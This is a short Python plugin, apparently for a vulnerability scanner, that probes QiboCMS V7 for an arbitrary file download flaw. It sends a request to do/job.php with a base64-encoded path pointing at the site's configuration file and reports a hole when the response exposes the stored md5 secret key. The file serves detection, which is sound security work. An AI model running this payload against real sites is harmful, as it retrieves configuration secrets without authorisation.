#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = LinE
#_PlugName_ = QiboCMS V7 Arbitrary File Download
#_Function_ = QiboCMS V7 任意文件下载漏洞
#_FileName_ = QiboCMS_Arbitrary_File_Download.py

def assign(service, arg):
    if service == "qibocms":
        return True, arg 

def audit(arg):
    payload = 'do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl(target)
    if code == 200 and "webdb\['mymd5'\]" in res:
        security_hole(target)


if __name__ == '__main__':
    from dummy import *
    audit(assign('qibocms', 'http://www.example.com/')[1])